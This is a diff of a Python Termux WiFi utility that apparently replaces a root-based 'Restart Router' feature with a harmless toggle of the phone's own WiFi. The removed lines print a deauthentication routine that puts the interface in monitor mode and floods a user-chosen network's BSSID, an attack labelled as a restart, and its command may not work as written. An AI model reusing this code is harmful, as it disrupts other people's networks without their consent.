@@ -35,100 +35,40 @@ def print_banner():
 ╚══════════════════════════════════════════╝{Colors.RESET}"""
     print(banner)
 
-def check_root():
-    """Check if Termux has root access"""
+def check_termux_api():
+    """Check if Termux:API is installed"""
     try:
-        result = subprocess.run(['su', '-c', 'whoami'], 
-                              capture_output=True, 
-                              text=True)
-        return result.stdout.strip() == 'root'
-    except:
+        subprocess.run(['termux-wifi-scaninfo'], 
+                      capture_output=True)
+        return True
+    except FileNotFoundError:
+        print(f"\n{Colors.RED}Termux:API not found!{Colors.RESET}")
+        print(f"\n{Colors.YELLOW}Please install Termux:API app from F-Droid{Colors.RESET}")
+        print(f"Then run: {Colors.GREEN}pkg install termux-api{Colors.RESET}")
         return False
 
-def check_tools():
-    """Check if required tools are installed"""
-    tools = ['nmap', 'iw']
-    missing = []
-    
-    for tool in tools:
-        try:
-            subprocess.run([tool, '--help'], 
-                         capture_output=True)
-        except FileNotFoundError:
-            missing.append(tool)
-    
-    if missing:
-        print(f"\n{Colors.RED}Missing tools: {', '.join(missing)}{Colors.RESET}")
-        print(f"\n{Colors.YELLOW}Installing required tools...{Colors.RESET}")
-        try:
-            subprocess.run(['pkg', 'install', 'root-repo'], check=True)
-            subprocess.run(['pkg', 'install', 'nmap'], check=True)
-            subprocess.run(['pkg', 'install', 'iw'], check=True)
-            return True
-        except:
-            print(f"{Colors.RED}Failed to install tools{Colors.RESET}")
-            return False
-    return True
-
-def get_interface():
-    """Get wireless interface name"""
+def get_wifi_info():
+    """Get current WiFi connection information"""
     try:
-        result = subprocess.run(['su', '-c', 'iw dev'], 
+        result = subprocess.run(['termux-wifi-connectioninfo'], 
                               capture_output=True, 
                               text=True)
-        for line in result.stdout.split('\n'):
-            if 'Interface' in line:
-                return line.split('Interface')[1].strip()
+        if result.returncode == 0:
+            return json.loads(result.stdout)
         return None
     except:
         return None
 
 def scan_networks():
-    """Scan for WiFi networks using iw"""
+    """Scan for WiFi networks using Termux API"""
     try:
-        interface = get_interface()
-        if not interface:
-            print(f"{Colors.RED}No wireless interface found{Colors.RESET}")
-            return None
-            
-        print(f"\n{Colors.YELLOW}Scanning for networks...{Colors.RESET}")
-        
-        # Put interface in monitor mode
-        subprocess.run(['su', '-c', f'ifconfig {interface} down'], check=True)
-        subprocess.run(['su', '-c', f'iwconfig {interface} mode monitor'], check=True)
-        subprocess.run(['su', '-c', f'ifconfig {interface} up'], check=True)
-        
-        # Scan for networks
-        result = subprocess.run(['su', '-c', f'iw dev {interface} scan'],
+        result = subprocess.run(['termux-wifi-scaninfo'],
                               capture_output=True,
                               text=True)
         
-        # Parse scan results
-        networks = []
-        current_network = {}
-        
-        for line in result.stdout.split('\n'):
-            line = line.strip()
-            if 'BSS' in line and '(' in line:
-                if current_network:
-                    networks.append(current_network)
-                current_network = {'bssid': line.split('(')[0].split('BSS')[1].strip()}
-            elif 'SSID: ' in line:
-                current_network['ssid'] = line.split('SSID: ')[1]
-            elif 'signal: ' in line:
-                current_network['signal'] = line.split('signal: ')[1].split(' ')[0]
-            elif 'freq: ' in line:
-                current_network['freq'] = line.split('freq: ')[1]
-                
-        if current_network:
-            networks.append(current_network)
-            
-        # Put interface back in managed mode
-        subprocess.run(['su', '-c', f'ifconfig {interface} down'], check=True)
-        subprocess.run(['su', '-c', f'iwconfig {interface} mode managed'], check=True)
-        subprocess.run(['su', '-c', f'ifconfig {interface} up'], check=True)
-        
-        return networks
+        if result.returncode == 0:
+            return json.loads(result.stdout)
+        return None
     except Exception as e:
         print(f"{Colors.RED}Error during scan: {str(e)}{Colors.RESET}")
         return None
@@ -141,135 +81,95 @@ def print_networks(networks):
         
     print(f"\n{Colors.BOLD}Available Networks:{Colors.RESET}")
     for i, net in enumerate(networks, 1):
-        signal = float(net.get('signal', 0))
-        signal_str = '▂▄▆█' if signal > -50 else '▂▄▆' if signal > -70 else '▂▄' if signal > -80 else '▂'
-        print(f"{i}. {Colors.GREEN}{net.get('ssid', 'Hidden Network')}{Colors.RESET}")
-        print(f"   ├─ BSSID: {net['bssid']}")
+        ssid = net.get('ssid', 'Hidden Network')
+        bssid = net.get('bssid', 'Unknown')
+        signal = int(net.get('level', 0))
+        freq = net.get('frequency', 0)
+        
+        # Convert signal strength to bars
+        signal_percent = (100 + signal) / 50  # Convert dBm to percentage
+        bars = int(signal_percent * 4)
+        signal_str = '▂▄▆█'[:bars] + '░' * (4 - bars)
+        
+        print(f"{i}. {Colors.GREEN}{ssid}{Colors.RESET}")
+        print(f"   ├─ BSSID: {bssid}")
         print(f"   ├─ Signal: {signal_str} ({signal} dBm)")
-        print(f"   └─ Freq: {net.get('freq', 'Unknown')} MHz")
+        print(f"   └─ Freq: {freq} MHz")
 
-def deauth_attack(interface, target_bssid):
-    """Send deauth packets using custom method"""
+def toggle_wifi(enable=True):
+    """Toggle WiFi on/off"""
     try:
-        print(f"\n{Colors.YELLOW}Starting deauth attack...{Colors.RESET}")
-        
-        # Put interface in monitor mode
-        subprocess.run(['su', '-c', f'ifconfig {interface} down'], check=True)
-        subprocess.run(['su', '-c', f'iwconfig {interface} mode monitor'], check=True)
-        subprocess.run(['su', '-c', f'ifconfig {interface} up'], check=True)
-        
-        # Create and send deauth packets
-        for _ in range(10):  # Send 10 rounds of packets
-            # Send deauth to broadcast
-            subprocess.run(['su', '-c', 
-                          f'iw dev {interface} mgmt deauth {target_bssid} reason 7'],
-                         check=True)
-            time.sleep(0.5)
-            
-        print(f"\n{Colors.GREEN}Deauth attack completed{Colors.RESET}")
-        
-        # Put interface back in managed mode
-        subprocess.run(['su', '-c', f'ifconfig {interface} down'], check=True)
-        subprocess.run(['su', '-c', f'iwconfig {interface} mode managed'], check=True)
-        subprocess.run(['su', '-c', f'ifconfig {interface} up'], check=True)
-        
+        subprocess.run(['termux-wifi-enable', str(enable).lower()],
+                      check=True)
+        time.sleep(2)  # Wait for WiFi to change state
         return True
-    except Exception as e:
-        print(f"{Colors.RED}Error during deauth: {str(e)}{Colors.RESET}")
+    except:
         return False
 
-def scan_network_info():
-    """Scan detailed network information"""
-    try:
-        interface = get_interface()
-        if not interface:
-            print(f"{Colors.RED}No wireless interface found{Colors.RESET}")
-            return
-            
-        print(f"\n{Colors.YELLOW}Scanning network info...{Colors.RESET}")
-        
-        # Get current connection info
-        result = subprocess.run(['su', '-c', f'iw dev {interface} link'],
-                              capture_output=True,
-                              text=True)
-        
-        if 'Not connected' in result.stdout:
-            print(f"\n{Colors.RED}Not connected to any network{Colors.RESET}")
-            return
-            
-        # Parse connection info
-        info = {}
-        for line in result.stdout.split('\n'):
-            line = line.strip()
-            if 'Connected to' in line:
-                info['bssid'] = line.split('Connected to')[1].strip()
-            elif 'freq: ' in line:
-                info['freq'] = line.split('freq: ')[1]
-            elif 'signal: ' in line:
-                info['signal'] = line.split('signal: ')[1].split(' ')[0]
-            elif 'SSID: ' in line:
-                info['ssid'] = line.split('SSID: ')[1]
-                
-        # Print info
-        if info:
-            print(f"\n{Colors.BOLD}Current Connection:{Colors.RESET}")
-            print(f"├─ Network: {Colors.GREEN}{info.get('ssid', 'Unknown')}{Colors.RESET}")
-            print(f"├─ BSSID:   {info.get('bssid', 'Unknown')}")
-            print(f"├─ Signal:   {info.get('signal', 'Unknown')} dBm")
-            print(f"└─ Freq:     {info.get('freq', 'Unknown')} MHz")
-            
-            # Get IP info
-            ip_result = subprocess.run(['su', '-c', 'ip addr show ' + interface],
-                                     capture_output=True,
-                                     text=True)
-            
-            for line in ip_result.stdout.split('\n'):
-                if 'inet ' in line:
-                    ip = line.split('inet ')[1].split('/')[0]
-                    print(f"\n{Colors.BOLD}IP Information:{Colors.RESET}")
-                    print(f"└─ IP Address: {Colors.BLUE}{ip}{Colors.RESET}")
-        
-    except Exception as e:
-        print(f"{Colors.RED}Error getting network info: {str(e)}{Colors.RESET}")
-
-def restart_router():
-    """Restart router using deauth attack"""
-    if not check_root():
-        print(f"\n{Colors.RED}⚠️ Root access required!{Colors.RESET}")
-        print(f"{Colors.YELLOW}Please run Termux with root access{Colors.RESET}")
-        return
-        
-    if not check_tools():
-        return
-        
-    # Scan for networks
-    networks = scan_networks()
-    if not networks:
-        return
-        
-    print_networks(networks)
+def restart_wifi():
+    """Restart WiFi connection"""
+    print(f"\n{Colors.YELLOW}📱 Restarting WiFi...{Colors.RESET}")
     
-    try:
-        choice = int(input(f"\n{Colors.BOLD}Choose network to restart (1-{len(networks)}): {Colors.RESET}")) - 1
-        if 0 <= choice < len(networks):
-            target = networks[choice]
-            interface = get_interface()
-            
-            if deauth_attack(interface, target['bssid']):
-                print(f"\n{Colors.GREEN}✅ Network restart attempt completed{Colors.RESET}")
-            else:
-                print(f"\n{Colors.RED}❌ Failed to restart network{Colors.RESET}")
-        else:
-            print(f"\n{Colors.RED}Invalid choice!{Colors.RESET}")
-    except ValueError:
-        print(f"\n{Colors.RED}Invalid input!{Colors.RESET}")
-    except KeyboardInterrupt:
-        print(f"\n{Colors.YELLOW}Operation cancelled{Colors.RESET}")
+    # Disable WiFi
+    print(f"{Colors.RED}→ Disabling WiFi...{Colors.RESET}")
+    if not toggle_wifi(False):
+        print(f"{Colors.RED}Failed to disable WiFi{Colors.RESET}")
+        return
+    
+    time.sleep(2)
+    
+    # Enable WiFi
+    print(f"{Colors.GREEN}→ Enabling WiFi...{Colors.RESET}")
+    if not toggle_wifi(True):
+        print(f"{Colors.RED}Failed to enable WiFi{Colors.RESET}")
+        return
+    
+    # Wait for connection with animation
+    print(f"\n{Colors.CYAN}Waiting for connection...{Colors.RESET}")
+    animation = "|/-\\"
+    for i in range(10):
+        print(f"\r{Colors.CYAN}Connecting... {animation[i % len(animation)]}{Colors.RESET}", 
+              end='')
+        time.sleep(0.5)
+    print()
+    
+    # Check new connection
+    info = get_wifi_info()
+    if info and info.get('ssid'):
+        print(f"\n{Colors.GREEN}✅ Connected to: {info['ssid']}{Colors.RESET}")
+    else:
+        print(f"\n{Colors.RED}❌ Not connected to any network{Colors.RESET}")
+
+def print_wifi_info():
+    """Print current WiFi connection information"""
+    info = get_wifi_info()
+    
+    if not info:
+        print(f"\n{Colors.RED}Not connected to any network{Colors.RESET}")
+        return
+        
+    ssid = info.get('ssid', 'Unknown')
+    bssid = info.get('bssid', 'Unknown')
+    rssi = info.get('rssi', 0)
+    ip = info.get('ip', 'Unknown')
+    link_speed = info.get('link_speed', 'Unknown')
+    
+    # Calculate signal strength
+    signal_percent = (100 + rssi) / 50  # Convert dBm to percentage
+    bars = int(signal_percent * 4)
+    signal_str = '▂▄▆█'[:bars] + '░' * (4 - bars)
+    
+    print(f"\n{Colors.BOLD}Current Connection:{Colors.RESET}")
+    print(f"├─ Network: {Colors.GREEN}{ssid}{Colors.RESET}")
+    print(f"├─ BSSID:   {bssid}")
+    print(f"├─ Signal:   {signal_str} ({rssi} dBm)")
+    print(f"├─ Speed:    {link_speed} Mbps")
+    print(f"└─ IP:       {Colors.BLUE}{ip}{Colors.RESET}")
 
 def print_menu():
     """Print interactive menu"""
     print(f"\n{Colors.BOLD}Options:{Colors.RESET}")
-    print(f"1. {Colors.GREEN}Restart Router (requires root){Colors.RESET}")
+    print(f"1. {Colors.GREEN}Restart WiFi{Colors.RESET}")
     print(f"2. {Colors.YELLOW}Show WiFi Info{Colors.RESET}")
     print(f"3. {Colors.BLUE}Scan Networks{Colors.RESET}")
     print(f"4. {Colors.RED}Exit{Colors.RESET}")
@@ -280,6 +180,13 @@ def main():
                        help='Force restart without confirmation')
     args = parser.parse_args()
     
+    if not check_termux_api():
+        return
+        
+    if args.force:
+        restart_wifi()
+        return
+    
     try:
         while True:
             clear_screen()
@@ -289,10 +196,10 @@ def main():
             choice = input(f"\n{Colors.BOLD}Choose an option (1-4):{Colors.RESET} ")
             
             if choice == '1':
-                restart_router()
+                restart_wifi()
                 input(f"\n{Colors.DIM}Press Enter to continue...{Colors.RESET}")
             elif choice == '2':
-                scan_network_info()
+                print_wifi_info()
                 input(f"\n{Colors.DIM}Press Enter to continue...{Colors.RESET}")
             elif choice == '3':
                 networks = scan_networks()
